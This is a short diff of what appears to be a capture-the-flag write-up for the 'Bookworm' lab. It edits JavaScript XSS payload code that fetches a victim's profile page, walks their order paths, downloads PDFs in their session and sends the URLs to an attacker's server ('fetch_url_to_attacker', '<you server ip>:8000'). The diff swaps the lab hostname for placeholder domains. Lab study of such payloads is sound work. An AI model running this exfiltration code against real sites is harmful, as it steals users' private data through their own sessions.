@@ -113,11 +113,11 @@ async function getPdf(url) {
         sendrequest(download);
     }
 }
-fetch("http://bookworm.htb/profile").then(async (res) => {
+fetch("http://thing.edu/profile").then(async (res) => {
     const html = await res.text();
     const orders = getOrder(html);
     for (const path of orders) {
-        const url = "http://bookworm.htb" + path;
+        const url = "http://thing.edu" + path;
         getPdf(url);
     }
 });
@@ -176,8 +176,8 @@ fetch("http://<you server ip>:8000/?trying")
 fetch("http://thing.edu/profile").then(
  async response=>{
  for (const path of get_orders(await response.text())){
- fetch_url_to_attacker("http://bookworm.htb" + path);
- get_pdf("http://bookworm.htb" + path);
+ fetch_url_to_attacker("http://yawn.edu" + path);
+ get_pdf("http://yawn.edu" + path);
  }
  }
 )
